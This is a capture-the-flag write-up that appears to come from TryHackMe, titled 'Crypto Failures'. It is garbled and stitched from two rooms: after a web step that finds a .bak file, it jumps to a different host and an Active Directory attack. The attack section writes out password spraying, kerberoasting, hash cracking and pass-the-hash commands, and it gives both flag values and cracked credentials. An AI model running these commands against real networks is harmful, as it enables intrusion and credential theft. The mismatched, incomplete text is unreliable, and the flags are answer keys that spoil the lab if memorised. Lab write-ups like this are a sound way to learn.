# Try Hack Me - Crypto Failures

**OWASP Category: A04:2025 Cryptographic Failures** 

Enumerated Ker!!!!!!!!!!!!!POPIS SHRNUTÍ

## Tools:
- **Web Browser**
- **Bash terminal**
- **nmap**

## Methodology:

1. **Enumerating open ports with nmap**
    - Nmap scan: nmap -sVC 10.112.191.122 
    -Results showed open ports **80** and **22**.

    <img src="\assets\Crypto_Failures.png" alt="nmap_reuslts" width="1000px">

2. **Exploring port 80**
    - This is what the website looks like on port 80:

    <img src="\assets\Crypto_Failures_80.png" alt="port_80" width="1000px">

    - There is an interesting comment left in the source code of the website signifying there could be some public-facing backup files:

    ```html
    <!-- TODO remember to remove .bak files-->
    ```

3. **Enumerating directories with .bak extension**
    - I user **gobuster** to enumerate directories that have php files ending with the extension .bak.
    
    ```bash
    gobuster dir -u http://10.112.191.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php.bak
    ```

    - We have found this public-facing path: /index.php.bak:

    <img src="\assets\Crypto_Failure_dir.png" alt="direcotries" width="1000px">

    - I visited the URL path and a file **index.php.bak** was downloaded.

    <img src="\assets\Crypto_Failures_file.png" alt="file_download" width="1000px">

4. **Connecting to SMB via Guest**
    - Trying to utilize the found Guest username and list SMB shares: nxc smb 10.112.156.194 -u 'guest' -p '' --shares .

    <img src="\assets\Soupdecode01_guest.png" alt="guest" width="1000px">

5. **Brute-forcing SMB via RID**
    - nxc smb 10.112.156.194 -u 'guest' -p '' --rid-brute
    - The results had so many usernames - with grep, we will filter only the plain usernames without the domain name and save it to a file usernames.txt, so we can use them in a brute-force in the next step: nxc smb 10.112.156.194 -u 'guest' -p '' --rid-brute | grep -oP '(?<=SOUPEDECODE\\)[^ ]+' > usernames.txt .
    We have 1089 usernames saved in the file.

6. **Brute-forcing SMB**
    - Trying to breute-force to SMB via list of valid usernames with password being the same as the username: awk '{print $0":"$0}' usernames.txt > formatted.txt . 
    - Executing the brute-force via kerbrute: ./kerbrute_linux_amd64 bruteforce formatted.txt --dc DC01.SOUPEDECODE.LOCAL -d SOUPEDECODE.LOCAL .
    - Found 1 valid credentials:
        [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317

7. **Connecting to SMB via valid credentials**
    - Using NetExec to connect as user 'ybob317': nxc smb 10.112.156.194 -u 'ybob317' -p 'ybob317' --shares . Success!

    <img src="\assets\Soupdecode01_SMBlist.png" alt="SMB_list" width="1000px">

8. **Accessing share /Users**
    - Via smbclient accessing the share /Users: smbclient //10.112.156.194/Users -U ybob317%ybob317 . After exploring the share I found the user flag in: /Users/ybob317/Desktop/user.txt. Downloaded the user flag using: get user.txt (FLAG: 28189316c25dd3c0ad56d44d000d62a8).

9. **Kerberoasting**
    - Kerberoasting using nxc: nxc ldap 10.112.156.194 -u ybob317 -p ybob317 --kerberoasting output.txt .
    This command searching via LDAP account that have a set SPN (Service Principal Name), requests for the accounts TGS (Kerberos Service Ticket) and saves the aquired ticket hashes to .txt file.
    We found 5 SPN accounts, we will further user this one: file_svc. Saved the file_svc ticket hash into file hash.txt.

10. **Cracking the SPN account password**
    - Trying to decrypt the TGS hash using HashCat: hashcat -m13100 hash.txt /usr/share/wordlists/rockyou.txt . Success! Password is: Password123!! .

11. **Connecting to SMB through SPN account**
    - nxc smb 10.112.156.194 -u 'file_svc' -p 'Password123!!' --shares . Successfully connected and listed shares - we can now also read the /backup. 
    - smbclient //10.112.156.194/backup -U file_svc . We found the file backup_extract.txt -> get backup_extract.txt .
    - We see some NTLM hashes in the file:

    <img src="\assets\Soupdecode01_backup.png" alt="backup" width="1000px">

12. **Pass-the-Hash**
    - smbclient //10.112.156.194/C$ -U 'FileServer$%e41da7e79a4c76dbd9cf79d1cb325559' --pw-nt-hash
    - Found the flag in path: Users/Administrator/Desktop/root.txt
    - get root.txt
    - cat root.txt -> Flag: 27cb2be302c388d63d27c86bfdd5f56a

## Remediation
